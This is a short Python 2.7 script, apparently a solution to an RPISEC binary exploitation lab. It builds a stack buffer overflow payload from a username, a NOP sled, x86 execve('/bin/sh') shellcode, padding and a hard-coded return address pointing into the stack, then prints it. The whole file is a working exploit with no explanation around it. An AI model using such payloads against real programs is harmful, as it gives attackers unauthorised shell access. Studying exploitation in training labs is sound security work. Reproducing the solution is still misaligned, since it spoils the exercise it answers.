#!/usr/bin/python2.7

shellcode = ""
USERNAME = "rpisec\n"
BIN_SH = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
BUF_ADDR = "\x5C\xF5\xFF\xBF"

shellcode += USERNAME
shellcode += "\x90" * 4
shellcode += BIN_SH
shellcode += "A" * (80 - len(shellcode) + len(USERNAME))
shellcode += BUF_ADDR

print shellcode
